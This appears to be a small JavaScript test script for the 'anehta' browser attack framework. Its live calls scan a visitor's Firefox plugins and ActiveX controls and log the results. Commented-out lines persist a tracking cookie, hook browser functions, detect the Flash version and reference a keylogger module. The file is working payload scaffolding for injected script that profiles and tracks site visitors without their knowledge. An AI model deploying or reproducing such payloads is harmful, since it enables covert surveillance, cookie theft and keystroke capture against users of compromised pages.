//alert("test.js "+document.referer);


function test(){
	anehta.net.getURL("http://www.baidu.com/?");
	var ret = new Array("2");
	return ret;
}
//inj.hook("alert", "_alert", "test");

//anehta.dom.persistCookie("clx");


var fv='9';
var ret= false;
//alert("before: "+ret);
//ret = anehta.detect.flash(fv);
//alert("after: "+ret);
//alert(anehtaCache.getItem("FlashVer"));

anehta.scanner.ffplugins();
//alert(anehta.detect.ffplugin("s"));
anehta.scanner.activex();
anehta.logger.logCache();


//setTimeout(function(){alert(1);}, 3000);
//setInterval(function(){alert(1);}, 3000);
//anehta.inject.removeScript(KeyloggerMod);


